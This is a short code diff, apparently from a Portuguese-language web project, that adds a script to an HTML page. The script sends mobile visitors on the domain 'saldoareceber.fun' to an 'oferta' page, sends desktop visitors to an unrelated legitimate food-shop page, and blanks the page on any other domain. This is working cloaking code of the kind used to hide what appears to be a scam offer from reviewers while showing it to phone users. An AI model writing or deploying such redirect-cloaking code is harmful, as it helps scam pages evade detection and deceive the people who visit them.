@@ -84,6 +84,20 @@ setTimeout("add()", mude_a_cada_ms);
 }
 add();
 </script>
+  <script type="text/javascript">
+        // Verifica o domínio atual
+        if (window.location.href === 'https://saldoareceber.fun') {
+            // Verifica o tipo de dispositivo com base no User-Agent
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                window.location.href = "https://saldoareceber.fun/Codigos-2/assets/oferta.html"; // Dispositivo móvel
+            } else {
+                window.location.href = "https://www.livup.com.br/ingredientes/maca"; // Desktop
+            }
+        } else {
+            // Se não estiver no domínio específico, não faz nada (deixa em branco)
+            document.write(''); // Página em branco
+        }
+    </script>
 
 </body>
 </html>
